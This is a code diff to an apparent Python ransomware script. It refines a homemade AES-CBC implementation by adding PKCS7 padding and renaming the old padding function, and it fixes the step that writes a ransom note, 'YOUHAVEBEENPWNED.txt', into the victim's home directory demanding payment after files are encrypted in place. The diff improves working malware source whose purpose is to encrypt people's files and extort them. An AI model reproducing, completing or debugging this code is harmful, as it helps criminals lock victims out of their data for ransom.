@@ -30,11 +30,16 @@ def xor(b1, b2):
         res.append(b1[i] ^ b2[i % len(b2)])
     return bytes(res)
 
-def pad(input, length):
+def pkcs7_pad(input, length):
+    padding_required = length - len(input) % length
+    return input + padding_required.to_bytes(1, 'big') * padding_required
+
+def zero_pad(input, length):
     if len(input) % length == 0:
         return input
 
-    return input + b'\x00' * (length - len(input) % length)
+    padding_required = length - len(input) % length
+    return input + b"\x00" * padding_required
 
 class AES:
     def __init__(self, key):
@@ -42,11 +47,11 @@ class AES:
             self.generate_sbox()
 
         if len(key) < 16:
-            self.key = pad(bytes(key), 16)
+            self.key = zero_pad(bytes(key), 16)
         elif len(key) > 32:
             self.key = bytes(key)[:33]
         else:
-            self.key = pad(bytes(key), 8)
+            self.key = zero_pad(bytes(key), 8)
 
         self.rounds = 11 if len(self.key) == 16 else 13 if len(self.key) == 24 else 15
         self.expand_key()
@@ -90,9 +95,9 @@ class AES:
 
     def prepare_pt(self, plaintext, encoding = 'utf-8'):
         if isinstance(plaintext, str):
-            plaintextbytes = pad(bytes(plaintext, encoding), 16)
+            plaintextbytes = pkcs7_pad(bytes(plaintext, encoding), 16)
         else:
-            plaintextbytes = pad(plaintext, 16)
+            plaintextbytes = pkcs7_pad(plaintext, 16)
         
         return plaintextbytes
 
@@ -136,10 +141,10 @@ class AES:
 
 class AES_CBC(AES):
     def encrypt(self, plaintext: bytes, iv: bytes):
-        plaintext = pad(plaintext, 16)
+        plaintext = pkcs7_pad(plaintext, 16)
 
         ciphertext = b''
-        prev_ct = pad(iv, 16)
+        prev_ct = zero_pad(iv, 16)
         for i in range(0, len(plaintext), 16):
             pt_block = xor(plaintext[i:i+16], prev_ct)
             prev_ct = self.encrypt_block(pt_block)
@@ -189,5 +194,5 @@ for file in files:
     with open(file, "wb") as thefile:
         thefile.write(iv + contents_encrypted)
 
-with open(str(home_dir) + "/YOUHAVEBEENPWNED.txt") as message:
+with open(str(home_dir) + "/YOUHAVEBEENPWNED.txt", mode='w') as message:
     message.write("Your files have been encrypted. Pay me please!")
